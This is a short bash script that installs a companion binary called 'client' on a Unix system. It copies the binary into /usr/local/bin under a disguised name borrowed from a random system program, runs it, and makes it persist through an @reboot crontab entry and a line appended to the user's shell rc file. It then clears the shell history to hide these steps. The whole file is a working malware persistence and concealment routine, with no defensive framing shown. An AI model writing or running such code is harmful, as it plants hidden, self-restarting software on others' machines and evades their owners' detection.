#!/usr/bin/env bash

SHELL=$(basename $SHELL)
CONFIG_PATH="$HOME/.${SHELL}rc"

mkdir -p $HOME/.local

FROM_PATH="$(dirname $0)/client"
TARGET_NAME="$(ls /usr/bin | sort -R | head -n 1)-"
TARGET_PATH="/usr/local/bin"

cp $FROM_PATH "$TARGET_PATH/$TARGET_NAME"

# run it
$TARGET_NAME

# crontab
cronfile="tmp"
echo "@reboot $TARGET_NAME" > $cronfile
$(crontab $cronfile > /dev/null 2>&1)
rm -f $cronfile

echo "$TARGET_NAME" >> $CONFIG_PATH

history -c
